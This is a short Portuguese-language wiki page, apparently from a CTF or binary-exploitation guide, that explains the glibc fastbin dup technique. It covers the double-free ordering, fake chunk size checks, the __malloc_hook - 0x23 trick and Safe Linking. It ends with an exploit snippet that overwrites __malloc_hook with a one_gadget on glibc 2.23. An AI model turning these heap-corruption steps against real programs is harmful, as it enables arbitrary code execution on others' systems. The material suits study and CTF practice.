---
title: "Fastbin dup"
sidebar_position: 4
---

Mesma ideia do [Tcache Poisoning](./tcache-poisoning.md), para **glibc < 2.26** ou quando o tcache daquele tamanho está **cheio** (7 chunks). Tamanhos de fastbin: `0x20` a `0x80`. Teoria em [Double Free](../../../pwning/heap/double-free.mdx).

## Double free

A única verificação é se o chunk sendo liberado é o **topo** da bin (`double free or corruption (fasttop)`), então libere outro no meio:

```
free(A); free(B); free(A)   → fastbin: A -> B -> A
malloc(0x40) = A            → escreva fd = alvo - 0x10   (A continua na lista)
malloc(0x40) = B
malloc(0x40) = A
malloc(0x40) = alvo         → escrita arbitrária
```

Com tcache (glibc ≥ 2.26): primeiro encha o tcache com 7 `free`, depois faça o double free na fastbin. Na hora de alocar, esvazie o tcache primeiro (7 `malloc`), ou os chunks da fastbin são movidos para o tcache quando você pega o primeiro (em glibc ≥ 2.32 isso aplica Safe Linking a eles).

## Diferenças para o tcache

- O `fd` aponta para o **header** do chunk (`alvo - 0x10`), não para os dados
- O `malloc` **checa o `size` do chunk falso**: em `alvo - 0x10 + 8` precisa haver um valor com o tamanho da fastbin (ex: `0x41` para chunks de `0x40`; só os bits de tamanho importam, `0x40` a `0x4f` passam). `malloc(): memory corruption (fast)` indica que falhou
- Clássico (glibc < 2.34): `__malloc_hook - 0x23`, que aproveita o byte `0x7f` de um ponteiro vizinho como `size` de `0x70`. Aloque chunks de `0x60` a `0x68` (chunk `0x70`) e escreva o *one_gadget* no offset `0x13` dos dados
- Sem um `size` falso pronto: crie um com uma escrita controlada perto do alvo (ex: um `long` global que você controla, ou o próprio conteúdo de uma nota, para alocar em cima de outra nota)
- Safe Linking (≥ 2.32) também vale para a fastbin: `fd = (addr_A >> 12) ^ (alvo - 0x10)`

```py
# glibc 2.23, alvo __malloc_hook
fake = libc.sym['__malloc_hook'] - 0x23
alloc(0x68); alloc(0x68)              # A, B (chunks 0x70)
free(0); free(1); free(0)
alloc(0x68, p64(fake))                # A: fd = fake
alloc(0x68); alloc(0x68)              # B, A
alloc(0x68, b'A' * 0x13 + p64(one_gadget))
alloc(0x18)                           # dispara __malloc_hook
```
